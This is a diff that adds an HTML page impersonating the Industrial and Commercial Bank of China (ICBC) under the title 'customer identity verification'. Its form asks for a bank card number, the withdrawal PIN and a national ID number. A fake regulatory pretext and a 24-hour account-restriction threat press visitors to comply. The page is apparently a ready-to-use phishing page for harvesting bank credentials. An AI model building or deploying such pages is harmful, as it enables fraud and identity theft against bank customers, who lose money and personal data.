@@ -1,0 +1,20 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>中国工商银行客户身份信息核实</title>
+<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f4f6fa;color:#333}
+header{background:#c7000b;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
+.logo{font-size:23px;font-weight:700;letter-spacing:2px}
+.card{margin:36px auto;width:440px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 10px #0001}
+.card h2{margin:0 0 6px;font-size:20px;color:#c7000b}.card p{margin:0 0 16px;font-size:13px;color:#999}
+label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
+input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
+button{width:100%;height:42px;margin-top:18px;background:#c7000b;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
+.warn{margin:14px 0 0;font-size:12px;color:#c00}
+footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
+<body><header><span class="logo">中国工商银行 ICBC</span><span>客户身份核实</span></header>
+<div class="card"><h2>客户身份信息核实</h2><p>根据监管要求，请核实您的账户信息</p>
+<form action="/icbc/verify" method="post">
+<label>银行卡号 / 存折号</label><input placeholder="请输入卡号">
+<label>取款密码</label><input type="password" placeholder="请输入密码">
+<label>身份证号</label><input placeholder="请输入身份证号">
+<button type="submit">确认核实</button></form>
+<p class="warn">如 24 小时内未完成核实，账户相关功能将受到限制。</p></div>
+<footer>© 中国工商银行 · 客户服务热线 95588</footer></body></html>
